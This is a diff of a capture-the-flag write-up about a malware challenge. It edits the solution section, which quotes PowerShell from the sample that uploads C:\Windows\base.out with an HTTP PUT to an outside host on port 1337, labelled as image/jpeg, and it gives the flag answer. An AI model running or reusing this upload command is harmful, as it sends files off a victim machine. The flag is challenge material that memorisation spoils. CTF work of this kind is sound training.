@@ -16,22 +16,16 @@ WARNING - This challenge involves malware. Do not run this on your personal mach
 
 * [zig.zip](files/zig.zip)
 
-
-
 ## Solution
 
 By reviewing the movezig.ps1 one file, we located what it was doing. 
 
-
-
 ```powershell
-
 $filePath = "C:\Windows\base.out"
 $uri = "http://leveleffectgotallyourbase.com:1337/base.out"
 Invoke-RestMethod -Uri $uri -Method Put -InFile $filePath -ContentType "image/jpeg"
-
 ```
 
-
-
-**Flag: base.out**
+```
+base.out
+```
